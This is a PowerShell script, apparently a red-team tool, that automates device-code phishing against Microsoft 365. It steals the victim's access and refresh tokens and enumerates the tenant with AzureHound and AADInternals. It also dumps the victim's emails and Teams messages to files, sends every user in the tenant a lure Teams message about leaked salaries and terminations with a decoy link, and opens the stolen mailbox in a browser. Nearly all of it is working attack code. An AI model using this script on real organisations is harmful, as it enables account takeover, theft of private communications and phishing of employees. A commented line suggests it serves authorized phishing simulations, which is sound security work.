[CmdletBinding()]
param (
    [Parameter(ValueFromPipeline=$true)]
    [string]$teamsUser,
    [Parameter(ValueFromPipeline=$true)]
    [string]$messageContent,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$Token
)

# Check if AADInternals module is available
if (-not (Get-Module -Name AADInternals -ListAvailable)) {
    # Install the AADInternals module if it's not available
    Install-Module AADInternals -Force
    Write-Output "AADInternals module has been installed."
}

# Import the AADInternals module
Import-Module AADInternals -Force
Write-Output "AADInternals module has been imported."


# V2 does not contain -CaptureCode $Token for some reason...
# if (-not (Get-Module -Name TokenTactics -ListAvailable)) { Write-Output "TokenTactics not found, importing V2 fork from project folder";
#     Import-Module .\TokenTacticsV2\TokenTactics.psd1
# }

# V1
# Check if TokenTactics module is available
if (!(Get-Module -ListAvailable -Name TokenTactics)) {
    # Download the latest TokenTactics zip if the module is not available
    Write-Output "TokenTactics not found, downloading latest version into current working directory."
    Invoke-WebRequest -Uri https://github.com/rvrsh3ll/TokenTactics/archive/refs/heads/main.zip -OutFile tokentactics.zip

    if (Test-Path -Path .\tokentactics) {
        Remove-Item -Path .\tokentactics -Recurse -Force
    }

    Expand-Archive -LiteralPath .\tokentactics.zip -DestinationPath .\tokentactics -Force
    Get-ChildItem -Path .\tokentactics\tokentactics-main\* -Recurse | Move-Item -Destination .\tokentactics -Force
    Remove-Item -Path .\tokentactics\tokentactics-main -Recurse -Force
}

# Import or re-import the TokenTactics module
Import-Module .\tokentactics\TokenTactics.psd1 -Force
Write-Output "TokenTactics module has been imported."


# Check if $Token has been specified and is not null or empty
if ([string]::IsNullOrWhiteSpace($Token)) {
    # If $Token is not specified, just call Get-AzureToken for Graph
    Write-Output "`$Token is not specified. Generating new device code."
    Get-AzureToken -Client Graph    
} else {
    # If $Token is specified, use it with the CaptureCode parameter
    Write-Output "Using specified access token $Token."
    Get-AzureToken -Client Graph -CaptureCode $response.access_token # $Token
}


if(!($response)){ Read-Host "User didn't bite, try again."} else {
$access = $response.access_token
$refresh = $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

$acc = Read-AADIntAccessToken $access
$user = $acc.upn
$domain = $user.Split("@")[1]
Write-Output "$user took the bait."

### Azurehound 


# Assuming $response and $domain are already set
$tok = $response.refresh_token

# Azure hound bins
# Determine the operating system using the OS environment variable
$osType = $env:OS
$binaryName = ""
$exePath = ""

if ($osType -eq "Windows_NT") {
    $os = "windows"
    Write-Output "Detected Windows OS."
    $binaryName = "azurehound-windows-amd64.zip"
    $exePath = ".\azurehound.exe"
} else {
    $os = "linux"
    Write-Output "Detected Linux OS."
    $binaryName = "azurehound-linux-amd64.zip"
    $exePath = "./azurehound"
}

# Define the output path
$outputZipFile = $binaryName

# Check if the binary already exists and delete it if it does
if (Test-Path -Path $outputZipFile) {
    Remove-Item -Path $outputZipFile -Force
    Write-Output "Existing AzureHound binary deleted."
}

# Download the correct AzureHound binary for the detected OS
$downloadUrl = "https://github.com/BloodHoundAD/AzureHound/releases/latest/download/$binaryName"
Invoke-WebRequest -Uri $downloadUrl -OutFile $outputZipFile
Write-Output "Downloaded the AzureHound binary for $os."

# Expand the downloaded zip file
Expand-Archive -LiteralPath $outputZipFile -DestinationPath . -Force
Write-Output "Extracted the AzureHound binary."

# Clean up the zip file
Remove-Item -Path $outputZipFile -Force
Write-Output "Cleaned up the downloaded zip file."

# Run AzureHound with the specified parameters
Write-Output "Running Azurehound."
& $exePath -r $tok list --tenant $domain -o .\azurehound.json


# Execute the AzureHound command
# & $azureHoundCommand -r $tok list --tenant $domain -o .\azurehound.json 

Write-Output "AzureHound command executed for $os."

# AAdInternals recon
$core=Invoke-RefreshToAzureCoreManagementToken -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
# $results = Invoke-AADIntReconAsInsider
# $jsonContent = $results | ConvertTo-Json
# $jsonContent | Out-File -FilePath "intrecon.json"

# users and groups
$userEnum = Invoke-AADIntUserEnumerationAsInsider
$jsonContent = $userEnum | ConvertTo-Json
$jsonContent | Out-File -FilePath "userEnum.json"

# AzAD Group memberships
Connect-AzureAD -AadAccessToken $response.access_token -AccountId $user

# Users
# Retrieve all users
$users = Get-AzureADUser -All $true
$jsonContent = $users | ConvertTo-Json
$jsonContent | Out-File -FilePath "users.json"

# Retrieve all groups
$groups = Get-AzureADGroup -All $true
$jsonContent = $groups | ConvertTo-Json
$jsonContent | Out-File -FilePath "groups.json"

# Create an empty array to store group and member information
$groupData = @()

# Iterate over each group and retrieve its members
foreach ($group in $groups) {
    $groupInfo = [ordered]@{
        GroupName = $group.DisplayName
        Members = @()
    }

    # Retrieve members of the group
    $members = Get-AzureADGroupMember -ObjectId $group.ObjectId -All $true

    # Add members to group info
    foreach ($member in $members) {
        $groupInfo.Members += $member.DisplayName
    }

    # Add group info to the array
    $groupData += $groupInfo
}
# Convert the group data to JSON
$jsonData = $groupData | ConvertTo-Json
$jsonData | Out-File -FilePath "members.json"

# Requires V2: Attempt CAE token
# Invoke-RefreshToMSGraphToken -UseCAE -Domain $domain
# if ( $global:MSGraphTokenValidForHours -gt 23) { "MSGraph token is CAE capable, token is good for 24 hours. For more information: https://learn.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation " }

# Email
# dump emails via graph with tokentactics
$outlook=Invoke-RefreshToOutlookToken -domain $domain -refreshToken $response.refresh_token
Add-AADIntAccessTokenToCache -AccessToken $outlook.access_token -RefreshToken $outlook.refresh_token

$OutlookToken.refresh_token
$OutlookToken.access_token

# Refresh to Graph, Dump emails
Write-Output "Dumping last 200 emails from inbox"
Invoke-RefreshToMSGraphToken -refreshtoken  $response.refresh_token -domain $domain -Device iPhone -Browser Safari
$emails = Invoke-DumpOWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox -Device iPhone -Browser Safari -Top 200
# Convert the emails to JSON
$jsonData = $emails | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.emails.json"

# Get Teams Token and export for AADInternals
$teams=Invoke-RefreshToMSTeamsToken -refreshToken $response.refresh_token -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $teams.access_token -RefreshToken $teams.refresh_token

# Export TeamsMessages
Write-Output "Dumping Teams messages"
$msgs = Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Format-Table id,content,deletiontime,*type*,DisplayName 
# Convert the emails to JSON
$jsonData = $msgs | ConvertTo-Json
$jsonData | Out-File -FilePath "$user.teams.json"

# Send payload link to all users in tenant
# Example message content
if(!($messageContent)){ $messageContent = "Hey! Someone left the list of upcoming terminations and their salaries on the share drive, you won't believe who they're cutting <a href='https://decoy.com/contractors'>Decoy Contractors</a>."
}

# Example Teams message information
$teamsMessage = @{
    Body = @{
        ContentType = "html"
        Content = $messageContent
    }
}

# Delay between retries (in seconds)
$retryDelay = 5


# Send Teams message to each user with a retry mechanism
if (![string]::IsNullOrWhiteSpace($teamsUser)) {
    # If $teamsUser is specified, send the message only to that user
    $retryCount = 0
    $maxRetries = 3
    
    do {
        try {
            Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage
            Write-Host "Message sent to $teamsUser successfully."
            break  # If successful, exit the retry loop
        } catch {
            Write-Host "Error sending message to $teamsUser. Retrying in $retryDelay seconds..."
            Start-Sleep -Seconds $retryDelay
            $retryCount++
        }
    } while ($retryCount -lt $maxRetries)
} else {
    # If $teamsUser is not specified, loop through the $users array and send messages
    foreach ($user in $users) {
        $retryCount = 0
        $maxRetries = 3
        $recipient = $user.UserPrincipalName

        do {
            try {
                Send-AADIntTeamsMessage -Recipients $recipient -Message $teamsMessage
                Write-Host "Message sent to $recipient successfully."
                break  # If successful, exit the retry loop
            } catch {
                Write-Host "Error sending message to $recipient. Retrying in $retryDelay seconds..."
                Start-Sleep -Seconds $retryDelay
                $retryCount++
            }
        } while ($retryCount -lt $maxRetries)
    }
}

# Open Mailboxz in browser with Burp, paste into repeater
Read-Host "Pausing here. Press enter to open users inbox in browser or Ctrl+C to cancel"
Invoke-RefreshToSubstrateToken -refreshToken $response.refresh_token -domain $domain -Device AndroidMobile -Browser Android
Invoke-OpenOWAMailboxInBrowser -AccessToken $SubstrateToken.access_token -Device Mac -Browser Edge

}






# One Drive PoC
# Create a new OneDriveSettings object
# Get-WmiObject -Class Win32_NTDomain | select DomainName,DomainGuid
# $os = New-AADIntOneDriveSettings
# Get-AADIntOneDriveFiles -OneDriveSettings $os | Format-Table
# Get-AADIntOneDriveFiles -OneDriveSettings $os -DomainGuid "667965e7-de8e-440d-adc3-371a35474a41" | Format-Table

# Set-AADIntTeamsStatusMessage -Message "My cool status message" -AccessToken $MSTeamsToken.access_token -Verbose
# if(!(teamsMessage)){ $teamsMessage = "$user has taken the bait in a phishing simulation. This message is to simulate an attacker taking control of the account. Please follow up with your IT security team."}
# if($teamsUser) { Send-AADIntTeamsMessage -Recipients $teamsUser -Message $teamsMessage } else { Write-Output "Skipping the Teams message."}

